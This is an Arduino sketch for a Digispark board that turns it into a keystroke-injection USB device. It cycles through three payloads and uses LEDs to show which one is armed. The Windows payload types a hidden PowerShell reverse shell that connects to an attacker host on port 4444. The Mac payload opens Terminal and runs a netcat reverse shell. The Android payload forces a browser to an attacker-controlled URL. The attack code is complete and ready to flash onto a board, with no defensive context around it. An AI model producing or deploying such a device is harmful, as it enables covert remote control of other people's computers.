#include "DigiKeyboard.h"
#include <EEPROM.h>

// --- HARDWARE CONFIGURATION ---
// If you are using a standard Digispark, you might only have one LED (usually Pin 1).
// To see "Red" and "Green", you need to wire two LEDs or use an RGB shield.
// Pin 0 and Pin 1 are the safest output pins.
#define PIN_GREEN 0
#define PIN_RED   1

// --- SETTINGS ---
#define TOTAL_MODES 3       // How many scripts are in the rotation
#define ABORT_WINDOW 2000   // Time in ms the LED stays RED before firing (The "Pull-Out" window)
#define MEMORY_ADDR 0       // EEPROM address to store the counter

void setup() {
  // Initialize Pins
  pinMode(PIN_GREEN, OUTPUT);
  pinMode(PIN_RED, OUTPUT);
  
  // Turn off everything initially
  digitalWrite(PIN_GREEN, LOW);
  digitalWrite(PIN_RED, LOW);

  // --- 1. ROTATION LOGIC ---
  // Read the current mode from persistent memory
  byte currentMode = EEPROM.read(MEMORY_ADDR);

  // Sanity Check: If the chip is fresh, EEPROM might be 255. Reset to 0.
  if (currentMode >= TOTAL_MODES) {
    currentMode = 0;
  }

  // Calculate the NEXT mode immediately
  byte nextMode = (currentMode + 1) % TOTAL_MODES;

  // Save the NEXT mode to memory. 
  // This ensures that if you unplug NOW, the next time it boots, it will be different.
  EEPROM.write(MEMORY_ADDR, nextMode);

  // --- 2. SIGNALING (The Flashes) ---
  // Wait for USB enumeration first (Standard Digispark bootloader delay is ~2-5s usually)
  // We add a small delay to ensure power is stable.
  delay(500);

  // Flash GREEN 'currentMode + 1' times.
  // Mode 0 = 1 Flash (Script 1)
  // Mode 1 = 2 Flashes (Script 2)
  for (int i = 0; i <= currentMode; i++) {
    digitalWrite(PIN_GREEN, HIGH);
    delay(300);
    digitalWrite(PIN_GREEN, LOW);
    delay(300);
  }

  // --- 3. THE ARMING PHASE (Red Light) ---
  // Turn RED to indicate "Ready to Fire". 
  // This is where you pull it out if you want to skip to the next script.
  digitalWrite(PIN_RED, HIGH);
  delay(ABORT_WINDOW); 
  
  // --- 4. FIRE ---
  // If we are still here (power is on), the user wants to run this script.
  // Turn off Red to indicate processing.
  digitalWrite(PIN_RED, LOW);

  switch (currentMode) {
    case 0:
      payload_windows();
      break;
    case 1:
      payload_mac();
      break;
    case 2:
      payload_android();
      break;
  }

  // --- 5. COMPLETION ---
  // Turn Solid GREEN to say "It is done."
  digitalWrite(PIN_GREEN, HIGH);
  
  // End execution loop
  for (;;) { 
    // Just keep the green light on
  }
}

void loop() {
  // Unused in Digispark
}

// --------------------------------------------------------------------------------
// PAYLOAD 1: WINDOWS (The Reverse Shell)
// --------------------------------------------------------------------------------
void payload_windows() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  
  // The Minified Direct-Injection Shell from our previous discussion.
  // REPLACE 192.168.1.X and 4444
  String s = "powershell -NoP -W Hidden $c=New-Object System.Net.Sockets.TcpClient('192.168.1.X',4444);$s=$c.GetStream();$b=New-Object byte[] 65535;while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=[text.encoding]::ASCII.GetString($b,0,$i);$z=(iex $d 2>&1|Out-String);$y=$z+'PS '+(pwd).Path+'> ';$x=[text.encoding]::ASCII.GetBytes($y);$s.Write($x,0,$x.Length);$s.Flush()};$c.Close()";
  
  DigiKeyboard.print(s);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

// --------------------------------------------------------------------------------
// PAYLOAD 2: MAC (The "Spotlight" Terminal)
// --------------------------------------------------------------------------------
void payload_mac() {
  // Command + Space to open Spotlight
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  
  // Open Terminal
  DigiKeyboard.print("Terminal");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000); // Wait for app launch
  
  // Run a command (e.g., Simple connection back or just a scare tactic)
  // Here we just netcat back to the listener for a basic connection
  DigiKeyboard.print("nc 192.168.1.X 4444 -e /bin/zsh");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

// --------------------------------------------------------------------------------
// PAYLOAD 3: ANDROID / GENERIC (The Browser Force)
// --------------------------------------------------------------------------------
void payload_android() {
  // Attempt to open browser via common shortcuts
  // Method A: Windows Key + B (works on some Androids)
  DigiKeyboard.sendKeyStroke(KEY_B, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  
  // Method B: Just type URL (if search bar is open)
  // Method C: Tab around? Hard to predict.
  // Best bet: If the user is on Home screen, typing usually triggers Google Search.
  
  DigiKeyboard.print("http://192.168.1.X/mobile_tagged");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
